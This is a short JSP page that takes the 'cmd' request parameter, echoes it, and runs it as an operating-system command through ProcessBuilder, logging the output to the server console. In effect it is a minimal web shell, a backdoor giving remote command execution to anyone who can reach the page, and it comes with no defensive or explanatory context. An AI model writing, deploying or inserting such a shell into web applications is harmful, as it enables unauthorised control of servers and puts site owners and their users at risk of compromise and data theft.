<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.IOException" %>
<%
    PrintWriter out1 = response.getWriter();
    String cmd = request.getParameter("cmd");
    out1.print(cmd);
    try {
        ProcessBuilder processBuilder = new ProcessBuilder(cmd.split("\\s+"));
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        }
        int exitCode = process.waitFor();
        System.out.println("Command exited with code: " + exitCode);
    } catch (IOException | InterruptedException e) {
        e.printStackTrace();
    }
%>